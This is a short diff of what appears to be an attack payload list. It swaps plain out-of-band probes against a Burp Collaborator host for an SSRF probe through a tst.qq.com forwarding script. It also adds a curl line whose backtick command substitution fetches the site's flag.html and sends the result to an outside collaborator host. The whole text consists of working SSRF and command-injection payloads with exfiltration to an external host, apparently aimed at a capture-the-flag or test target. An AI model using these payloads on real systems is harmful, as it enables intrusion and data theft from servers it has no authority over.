@@ -1,4 +1,2 @@
-curl http://qysxxudn9pcq3e1cj829sb9f2681wq.burpcollaborator.net/curl
-wget http://qysxxudn9pcq3e1cj829sb9f2681wq.burpcollaborator.net/wget
-ping ping.qysxxudn9pcq3e1cj829sb9f2681wq.burpcollaborator.net
-nslookup ns.qysxxudn9pcq3e1cj829sb9f2681wq.burpcollaborator.net
+curl http://tst.qq.com/ssrf_forward.php?host=bkzijfz8vaybpznx5touewv0orutii.burpcollaborator.net
+curl http://g3kn2kidefhg8462oy7zx1e57wd11q.burpcollaborator.net/1111`curl http://tst.qq.com/flag.html`
